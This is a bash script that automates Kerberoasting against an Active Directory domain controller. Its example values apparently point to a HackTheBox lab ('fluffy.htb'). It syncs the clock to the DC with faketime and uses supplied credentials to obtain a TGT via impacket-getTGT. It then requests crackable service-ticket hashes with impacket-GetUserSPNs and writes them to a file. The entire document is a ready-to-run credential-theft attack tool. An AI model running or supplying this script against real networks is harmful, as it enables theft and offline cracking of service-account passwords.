#!/bin/bash

# --- Colors for output ---
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}--- Starting Automated Kerberoasting Script ---${NC}"

# --- Prompt for Configuration ---
echo -e "${YELLOW}\n--- Configuration ---${NC}"

read -p "Enter Target DC IP (e.g., 10.129.243.18): " TARGET_DC_IP
read -p "Enter Target Domain (lowercase, e.g., fluffy.htb): " TARGET_DOMAIN
read -p "Enter Target Realm (UPPERCASE, e.g., FLUFFY.HTB): " TARGET_REALM
read -p "Enter Username (e.g., j.fleischman): " USERNAME
read -s -p "Enter Password: " PASSWORD # -s for silent input
echo # Newline after password input

OUTPUT_HASHS_FILE="kerberoast.hashes"
CCACHE_FILE="${USERNAME}.ccache" # .ccache file name generated

echo -e "${YELLOW}\n--- Summary of Configuration ---${NC}"
echo -e "DC IP: ${GREEN}${TARGET_DC_IP}${NC}"
echo -e "Domain: ${GREEN}${TARGET_DOMAIN}${NC}"
echo -e "Realm: ${GREEN}${TARGET_REALM}${NC}"
echo -e "User: ${GREEN}${USERNAME}${NC}"
echo -e "Output Hashes File: ${GREEN}${OUTPUT_HASHS_FILE}${NC}"
echo -e "Kerberos Cache File: ${GREEN}${CCACHE_FILE}${NC}"

# --- Function to get and format DC time for faketime ---
get_dc_time_for_faketime() {
    echo -e "${YELLOW}\n--- Obtaining DC time using ntpdate ---${NC}" >&2
    NTP_RAW_OUTPUT=$(ntpdate -q "$TARGET_DC_IP" 2>&1)

    if [ -z "$NTP_RAW_OUTPUT" ]; then
        echo -e "${RED}Error: 'ntpdate -q' returned no output. Check DC connectivity or NTP service.${NC}" >&2
        return 1 # Fail
    fi

    # Extract date and time. Your specific format is "YYYY-MM-DD HH:MM:SS.microseconds"
    FAKETIME_STRING_RAW=$(echo "$NTP_RAW_OUTPUT" | head -n 1 | cut -d'.' -f1)

    # Additional verification for expected format
    if ! [[ "$FAKETIME_STRING_RAW" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}\ [0-9]{2}:[0-9]{2}:[0-9]{2}$ ]]; then
        echo -e "${RED}Error: Extracted date part ('$FAKETIME_STRING_RAW') does not match expected format (YYYY-MM-DD HH:MM:SS).${NC}" >&2
        echo -e "${RED}Full output of ntpdate -q was:${NC}\n$NTP_RAW_OUTPUT" >&2
        return 1 # Fail
    fi

    echo -e "${GREEN}Time string obtained for faketime: ${FAKETIME_STRING_RAW}${NC}" >&2
    echo "$FAKETIME_STRING_RAW" # This goes to stdout to be captured
    return 0 # Success
}

# --- 1. Verify faketime installation ---
if ! command -v faketime &> /dev/null; then
    echo -e "${RED}Error: 'faketime' is not installed. Attempting to install...${NC}"
    sudo apt update && sudo apt install faketime -y
    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: Failed to install 'faketime'. Exiting.${NC}"
        exit 1
    fi
    echo -e "${GREEN}'faketime' installed successfully.${NC}"
fi

# --- 2. Clean up old .ccache files ---
echo -e "${YELLOW}\n--- Cleaning up old .ccache files ---${NC}"
rm -f "${CCACHE_FILE}"
echo -e "${GREEN}Old .ccache files removed.${NC}"

# --- 3. Obtain the TGT (Ticket Granting Ticket) ---
echo -e "${YELLOW}\n--- Obtaining TGT for ${USERNAME}@${TARGET_DOMAIN} ---${NC}"
# Get DC time right before the faketime call
CURRENT_FAKETIME=$(get_dc_time_for_faketime)
if [ $? -ne 0 ]; then exit 1; fi # Exit if get_dc_time_for_faketime failed

# Export KRB5CCNAME so impacket-getTGT saves the ticket there
export KRB5CCNAME="./${CCACHE_FILE}"

sudo faketime "$CURRENT_FAKETIME" impacket-getTGT "${TARGET_DOMAIN}/${USERNAME}:${PASSWORD}" -dc-ip "$TARGET_DC_IP"
if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to obtain TGT. Check credentials or DC IP. Ensure ccache was generated.${NC}"
    exit 1
fi
echo -e "${GREEN}TGT obtained and saved to ${CCACHE_FILE}.${NC}"

# --- 4. Perform Kerberoasting ---
echo -e "${YELLOW}\n--- Performing Kerberoasting for ${TARGET_REALM} ---${NC}"
# Get DC time right before the faketime call for GetUserSPNs
CURRENT_FAKETIME=$(get_dc_time_for_faketime)
if [ $? -ne 0 ]; then exit 1; fi # Exit if get_dc_time_for_faketime failed

# Ensure ccache is found (KRB5CCNAME is already set)
sudo faketime "$CURRENT_FAKETIME" impacket-GetUserSPNs \
  -dc-ip "$TARGET_DC_IP" \
  -k \
  -no-pass \
  -request \
  -outputfile "$OUTPUT_HASHS_FILE" \
  -target-domain "$TARGET_DOMAIN" \
  "${TARGET_REALM}/"

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Kerberoasting failed. Check previous errors for details.${NC}"
    echo -e "${YELLOW}Common issues: DNS resolution for DC hostname (add to /etc/hosts), or no vulnerable SPNs found.${NC}"
    exit 1
fi

echo -e "${GREEN}\n--- Kerberoasting completed ---${NC}"
echo -e "${GREEN}Hashes saved to: ${OUTPUT_HASHS_FILE}${NC}"
echo -e "${YELLOW}Don't forget to clean up temporary .ccache files if not needed!${NC}"
echo -e "${YELLOW}e.g., rm -f ${CCACHE_FILE}${NC}"

echo -e "${GREEN}\n--- Script finished ---${NC}"
